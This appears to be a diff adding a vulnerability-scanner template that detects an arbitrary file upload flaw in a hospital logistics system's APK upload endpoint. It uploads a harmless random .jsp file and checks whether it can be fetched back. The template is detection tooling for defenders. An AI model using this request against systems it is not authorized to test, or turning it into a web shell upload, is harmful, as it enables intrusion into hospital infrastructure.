@@ -1,0 +1,55 @@
+id: hospital-logistics-upload-anyfile
+info:
+  name: Hospital Logistics Management System Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in the Hospital Logistics Management System's processApkUpload.upload endpoint.
+
+variables:
+  random_str: "{{rand_text_alphanumeric(4)}}"
+  encoded_content: "{{base64(random_str)}}"
+
+http:
+  - raw:
+      - |
+        POST /ajaxinvoke/frameworkModuleJob.processApkUpload.upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx
+
+        ------WebKitFormBoundaryFQqYtrIWb8iBxUCx
+        Content-Disposition: form-data; name="Filedata"; filename="{{random_str}}.jsp"
+        Content-Type: application/octet-stream
+
+        {{encoded_content}}
+        ------WebKitFormBoundaryFQqYtrIWb8iBxUCx--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"success\":true"
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - "apk/(?P<id>[0-9]{1,4})/"
+        internal: true
+
+  - raw:
+      - |
+        GET /apk/{{id}}/{{random_str}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{encoded_content}}"
